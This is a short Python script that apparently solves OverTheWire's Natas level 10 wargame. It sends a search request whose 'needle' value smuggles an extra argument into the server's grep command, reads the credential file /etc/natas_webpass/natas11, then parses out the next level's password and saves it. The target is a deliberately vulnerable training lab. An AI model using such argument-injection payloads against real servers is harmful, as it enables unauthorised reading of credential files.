import requests, re

url="http://natas10.natas.labs.overthewire.org/"
username="natas10"
# read password from generated file
file=open('password.txt', 'r')
password=file.read()

# RCE payload
# a /etc/natas_webpass/natas11
payload='?needle=a+%2Fetc%2Fnatas_webpass%2Fnatas11&submit=Search'
req=requests.get(url+payload, auth=(username, password)).text
# print(req)

# Parse password
str="natas11"
for line in req.splitlines():
    if str in line:
        l=line.split(':')
        print(l[1])
        with open('password.txt', 'w') as f:
            f.write(l[1])